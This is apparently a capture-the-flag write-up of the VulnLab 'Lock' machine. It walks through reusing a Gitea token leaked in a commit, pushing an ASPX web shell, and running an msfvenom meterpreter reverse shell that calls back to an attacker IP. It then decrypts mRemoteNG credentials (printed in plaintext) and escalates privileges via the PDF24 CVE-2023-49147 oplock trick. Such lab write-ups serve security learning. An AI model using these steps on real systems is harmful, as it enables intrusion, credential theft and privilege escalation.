# Lock

Hello Friends,

Remo is Back

In this write-up, Iâ€™ll walk through how I pwned theÂ **Lock** machine fromÂ **VulnLab**. From initial enumeration to gaining root access, Iâ€™ll explain the key steps, tools, and techniques used to complete the box.

![image.png](../images/lock-banner.png)

Letâ€™s start by scanning the machine.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p 80,445,3000,3389,5357,5985 --min-rate=1000 10.10.111.177
```

![image.png](../images/lock.png)

now letâ€™s navigate to the web application running on port 80.

![image.png](../images/lock%201.png)

> Itâ€™s a normal web application but we can notice that there are some users so letâ€™s create a simple list of them
> 

```bash
 john.larson
 saul.goodman
 sara.willsson
```

Now letâ€™s go and access the web application running on port 3000

![image.png](../images/lock%202.png)

> As we see we found a Gitea instance so letâ€™s go to the explore tab and see if there is any public repo.
> 

![image.png](../images/lock%203.png)

> As we see we got a repo for a user named ellen.freeman
> 

So letâ€™s go and see the script.

![image.png](../images/lock%204.png)

Notice that we got a script that is getting an access token from the environment variables so letâ€™s check if there was any changes happened on the script.

![image.png](../images/lock%205.png)

and we got a commit so letâ€™s access it now.

![image.png](../images/lock%206.png)

Notice that we got the user access token!

> At this point we can think about token reuse maybe the user just updated the script to get the token from the environment variables but  the token itself is still valid
> 

Now letâ€™s try to make a request to the api using the hardcoded token

```bash
curl http://10.10.111.177:3000/api/v1/user/repos -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" -k | jq .
```

![image.png](../images/lock%207.png)

> Great we got a response back and confirmed that we can reuse the token also we got a domain name so we can add it to the hosts file
> 

We you give it a look we will find another repo named website that is set to private

![image.png](../images/lock%208.png)

Letâ€™s download this repo and see what it have

```bash
git clone http://10.10.111.177:3000/ellen.freeman/website.git
```

![image.png](../images/lock%209.png)

> Note: when you get the popup for the password just enter the token and you will be fine.
> 

Now letâ€™s go to the directory

![image.png](../images/lock%2010.png)

it seem to be the website that is running on the port 80.

Letâ€™s get a aspx web shell.

![image.png](../images/lock%2011.png)

now letâ€™s use get add

```bash
git add webshell.aspx
git status
```

![image.png](../images/lock%2012.png)

now letâ€™s make a co,mit and push the webshell

```bash
git commit -am "Hacked"
git push
```

![image.png](../images/lock%2013.png)

> Again if you were asked for the password just enter the access token
> 

Now letâ€™s go back the the website running on port 80 and navigate to the web shell page

```bash
http://10.10.111.177/webshell.aspx
```

![image.png](../images/lock%2014.png)

notice that we got a shell so letâ€™s go and get a reverse shell

First create a malicious executable 

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.8.5.233 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
```

![image.png](../images/lock%2015.png)

now letâ€™s upload it to the victim machine

![image.png](../images/lock%2016.png)

now letâ€™s open metasploit handler.

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost tun0
set lport 443
set exitfunc thread
exploit
```

![image.png](../images/lock%2017.png)

Now letâ€™s go back and trigger the shell

```bash
shell.exe
```

![image.png](../images/lock%2018.png)

now letâ€™s see the handler

![image.png](../images/lock%2019.png)

and we got a shell!

Now letâ€™s navigate to the document directory

```bash
cd c:\users\ellen.freeman\documents
```

![image.png](../images/lock%2020.png)

There is a file named config.xml so letâ€™s cat it

```bash
type config.xml
```

![image.png](../images/lock%2021.png)

> Notice that we got a **mRemoteNG**Â config file with the password stored in it so letâ€™s go and try to decrypt the password.
> 

Decrypting the password.

```bash
python3 mremoteng_decrypt.py config.xml
```

![image.png](../images/lock%2022.png)

> We did it we got the password of the user Gale
username: Gale.Dekarios
password: ty8wnW9qCKDosXo6
> 

Now letâ€™s try to login using RDP

```bash
xfreerdp /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /v:10.10.111.177
```

![image.png](../images/lock%2023.png)

> We logged in! and got the user flag.
> 

Now letâ€™s try to get root access

As we notice that there is a software named PDF24 is installed on the machine so letâ€™s search for any CVE for this application.

![image.png](../images/lock%2024.png)

> The application is vulnerable to **CVE-2023-49147**
What the CVE does is simple if the application was installed via MSI all we will do is start the installer once again and choose the repair mode then set an oplock on a file that is called during the installation/repairing after word when the CMD that is running the application installer is opened it will not be closed meaning that now we have full admin access!
> 

Now letâ€™s navigate to the install directory.

```bash
cd C:\_install
```

![image.png](../images/lock%2025.png)

Now letâ€™s execute a command that will run the installer

```bash
msiexec.exe /fa pdf24-creator-11.15.1-x64.msi
```

![image.png](../images/lock%2026.png)

now letâ€™s upload and run the SetOplock tool that will give us the CMD

```bash
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

![image.png](../images/lock%2027.png)

Now letâ€™s see the triggered cmd

![image.png](../images/lock%2028.png)

Now to get an interactive shell right click

![image.png](../images/lock%2029.png)

Now select legacy console mode 

![image.png](../images/lock%2030.png)

Now letâ€™s select the Firefox browser.

![image.png](../images/lock%2031.png)

Now in the browser hit CTRL+o

![image.png](../images/lock%2032.png)

now in the tool bar write cmd.exe and press enter

![image.png](../images/lock%2033.png)

now letâ€™s go to the admin desktop and see the flag.

```bash
cd c:\Users\Administrator\Desktop
```

![image.png](../images/lock%2034.png)

Amazing i got the root flag! ðŸ¥³

![image.png](../images/lock%2035.png)

Thatâ€™s it for theÂ **Lock** machine! This challenge was a great test of enumeration and exploitation skills. Hope you found the write-up useful.
